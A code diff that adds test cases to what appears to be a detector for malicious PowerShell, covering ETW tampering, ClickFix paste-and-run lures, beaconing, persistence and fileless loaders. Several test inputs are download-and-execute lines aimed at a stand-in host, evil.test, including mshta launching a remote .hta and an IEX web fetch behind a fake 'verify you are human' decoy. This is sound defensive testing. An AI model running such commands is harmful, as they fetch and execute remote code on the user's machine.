@@ -91,6 +91,10 @@ describe('AMSI / ETW / Defender tampering', () => {
     const s = analyze("[Reflection.Assembly]::Load(...); EtwEventWrite patched via reflection")
     expect(s.find((x) => x.id === 'etw-tamper')?.specificity).toBe('strong')
   })
+
+  it('benign twin: a plain ETW/EventProvider diagnostics reference (no patch primitive) does NOT fire', () => {
+    expect(ids('New-Object System.Diagnostics.Eventing.EventProvider($guid); EtwEventWrite')).not.toContain('etw-tamper')
+  })
 })
 
 describe('ClickFix / paste-and-run', () => {
@@ -105,6 +109,17 @@ describe('ClickFix / paste-and-run', () => {
   it('benign twin: a plain hidden -File task does NOT fire', () => {
     const raw = "powershell -w hidden -nop -File C:\\ops\\job.ps1"
     expect(ids('Get-Date', raw)).not.toContain('clickfix')
+  })
+  it('benign twin: a hidden-window -File deployment that fetches+IEXes internally does NOT fire (file exec, not paste-and-run)', () => {
+    const raw = 'powershell -nop -w hidden -File C:\\ops\\deploy.ps1'
+    const text = "-File C:\\ops\\deploy.ps1 ; IEX (New-Object Net.WebClient).DownloadString('http://mirror.local/pkg')"
+    expect(ids(text, raw)).not.toContain('clickfix')
+  })
+  it('fires on mshta launching a remote .hta', () => {
+    expect(ids('mshta https://evil.test/x.hta')).toContain('clickfix')
+  })
+  it('fires on a CAPTCHA/verify-human decoy paired with a downloader', () => {
+    expect(ids("# verify you are human - ray id 8f2 #; IEX (iwr http://evil.test/x).Content")).toContain('clickfix')
   })
 })
 
@@ -127,6 +142,16 @@ describe('beaconing + reverse shell + loaders + persistence', () => {
   })
   it('benign twin: a bare Start-Sleep with no loop/fetch is not beaconing', () => {
     expect(ids("Start-Sleep -Seconds 5")).not.toContain('beaconing')
+  })
+  it('persistence fires as a FACT on a routine scheduled task but stays strong (cannot characterize alone)', () => {
+    const s = analyze('Register-ScheduledTask -TaskName NightlyBackup -Action $a -Trigger $t')
+    const p = s.find((x) => x.id === 'persistence')
+    expect(p).toBeTruthy()
+    expect(p!.specificity).toBe('strong')
+  })
+  it('benign twin: Add-Type compiling C# WITHOUT an alloc/inject primitive does NOT fire fileless-loader', () => {
+    expect(ids("Add-Type -TypeDefinition 'public class N { public static int F(){return 1;} }'"))
+      .not.toContain('fileless-loader')
   })
 })
 
